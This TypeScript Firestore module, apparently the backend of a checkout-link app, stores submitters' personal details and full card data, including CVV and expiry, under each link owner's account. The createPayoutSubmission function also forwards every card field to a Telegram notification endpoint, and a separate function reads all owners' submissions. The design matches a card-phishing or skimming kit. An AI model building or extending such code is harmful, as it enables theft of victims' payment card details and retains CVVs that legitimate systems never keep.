import {
  collection,
  collectionGroup,
  doc,
  setDoc,
  getDoc,
  getDocs,
  query,
  orderBy,
  updateDoc,
  serverTimestamp,
  Timestamp,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import type { CheckoutForm1Data } from "@/components/data/checkout-form-1-data";

export interface PayoutSubmissionInput {
  linkId: string;
  orderId: string;
  data: CheckoutForm1Data;
}

export interface PayoutSubmission {
  id: string;
  ownerUid: string;
  linkId: string;
  orderId: string;
  email: string;
  firstName: string;
  lastName: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
  cardName: string;
  cardNumber: string;
  cvv: string;
  expiryDate: string;
  saveInfo: boolean;
  brandName?: string;
  createdAt: Timestamp;
}

export async function createPayoutSubmission(
  ownerUid: string,
  { linkId, orderId, data }: PayoutSubmissionInput,
): Promise<PayoutSubmission> {
  if (!ownerUid) {
    throw new Error(
      "[createPayoutSubmission] ownerUid is falsy — cannot build doc path",
    );
  }

  const ref = doc(collection(db, "users", ownerUid, "payoutSubmissions"));

  const submission = {
    id: ref.id,
    ownerUid,
    linkId,
    orderId,
    email: data.email ?? "",
    firstName: data.firstName ?? "",
    lastName: data.lastName ?? "",
    phone: data.phone ?? "",
    address: data.address ?? "",
    city: data.city ?? "",
    state: data.state ?? "",
    zipCode: data.zipCode ?? "",
    country: data.country ?? "",
    cardName: data.cardName ?? "",
    cardNumber: data.cardNumber ?? "",
    cvv: data.cvv ?? "",
    expiryDate: data.expiryDate ?? "",
    saveInfo: !!data.saveInfo,
    createdAt: serverTimestamp(), // ← Firestore sentinel, never send this to Telegram
  };

  await setDoc(ref, submission);

  // fire-and-forget notification, don't block/fail the submission on this
  // send only plain serializable fields — no serverTimestamp sentinel
  fetch("/api/notify-telegram", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      orderId: submission.orderId,
      firstName: submission.firstName,
      lastName: submission.lastName,
      email: submission.email,
      phone: submission.phone,
      address: submission.address,
      city: submission.city,
      state: submission.state,
      zipCode: submission.zipCode,
      country: submission.country,

      cardName: submission.cardName,
      cardNumber: submission.cardNumber,
      cvv: submission.cvv,
      expiryDate: submission.expiryDate,
    }),
  }).catch((err) => console.error("Telegram notify failed:", err));

  return submission as unknown as PayoutSubmission;
}

export async function getPayoutSubmission(
  ownerUid: string,
  submissionId: string,
): Promise<PayoutSubmission | null> {
  const ref = doc(db, "users", ownerUid, "payoutSubmissions", submissionId);
  const snap = await getDoc(ref);
  if (!snap.exists()) return null;
  return snap.data() as PayoutSubmission;
}

export async function updatePayoutBrandName(
  ownerUid: string,
  submissionId: string,
  orderId: string,
  brandName: string,
): Promise<void> {
  const ref = doc(db, "users", ownerUid, "payoutSubmissions", submissionId);
  await updateDoc(ref, {
    brandName,
    brandUpdatedAt: serverTimestamp(),
  });

  fetch("/api/notify-telegram", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "brand_update",
      submissionId,
      orderId,
      brandName,
    }),
  }).catch((err) => console.error("Telegram notify failed:", err));
}

export async function getMyPayoutSubmissions(
  uid: string,
): Promise<PayoutSubmission[]> {
  const q = query(
    collection(db, "users", uid, "payoutSubmissions"),
    orderBy("createdAt", "desc"),
  );
  const snap = await getDocs(q);
  return snap.docs.map((d) => d.data() as PayoutSubmission);
}

export async function getAllPayoutSubmissions(): Promise<PayoutSubmission[]> {
  const q = query(
    collectionGroup(db, "payoutSubmissions"),
    orderBy("createdAt", "desc"),
  );
  const snap = await getDocs(q);
  return snap.docs.map((d) => d.data() as PayoutSubmission);
}
